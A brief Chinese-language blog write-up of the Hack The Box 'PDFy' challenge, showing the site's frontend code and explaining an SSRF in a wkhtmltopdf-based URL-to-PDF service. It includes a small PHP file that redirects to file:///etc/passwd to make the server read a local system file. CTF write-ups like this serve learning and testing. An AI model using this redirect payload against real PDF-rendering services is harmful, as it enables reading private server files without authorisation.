---
title: "【HTB Challenge】PDFy"
date: 2024-09-19
tags:
  - ctf
url: "/posts/HTB/PDFy/"
---

# PDFy

只有前端的 Source Code，沒什麼特別的


```js
const form       = document.getElementById('form');
const url        = document.getElementById('url');
const alerts     = document.getElementById('alerts');
const screenshot = document.getElementById('screenshot');
const loading    = document.getElementById('loading');

const flash = (message, level) => {
    alerts.innerHTML += `
        <div class="alert alert-${level}" role="alert">
            <button type="button" id="closeAlert" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            <strong>${message}</strong>
        </div>
    `;
};

form.addEventListener('submit', e => {
    e.preventDefault();

    alerts.innerHTML = '';
    screenshot.innerHTML = '';

    if (url.value.trim().length == 0) return flash('URL can\'t be empty', 'warning');

    loading.style.display = 'block';
    fetch('/api/cache', {
        method: 'POST',
        body: JSON.stringify({
            'url': url.value
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(resp => resp.json())
    .then(resp => {
        if (resp.message) {
            flash(resp.message, resp.level);
            
            setTimeout(() => {
                document.getElementById('closeAlert').click();
            }, 2800);
        }

        if (resp.domain) {
            screenshot.innerHTML += `
                <h2>Screenshot for <a href="${url.value}" target="_blank">${resp.domain}</a></h2>
                <iframe src="/static/pdfs/${resp.filename}" frameborder="0" scrolling="no" style="height:100vh;width:65%;">	
            `;
        }
    })
    .then(() => {
        url.value = '';
        loading.style.display = 'none';
    });
});
```

看起來是 Request 到指定的 URL，一個 SSRF

讓他 Request 到 127.0.0.1 看看，結果出錯

![image](/images/htb/pdfy/image1.png)

看來是用 wkhtmltopdf screenshot，

exploit.php

```php
<!DOCTYPE html>
<html>
<body>
<h1>Pwned by CompileErr0r</h1>
<?php
header('location:file:///etc/passwd');
?>
</body>
</html>
```

我把它上傳到我的 VPS 上，然後讓 PDFy 發 Request，成功拿到 flag

![image](/images/htb/pdfy/image2.png)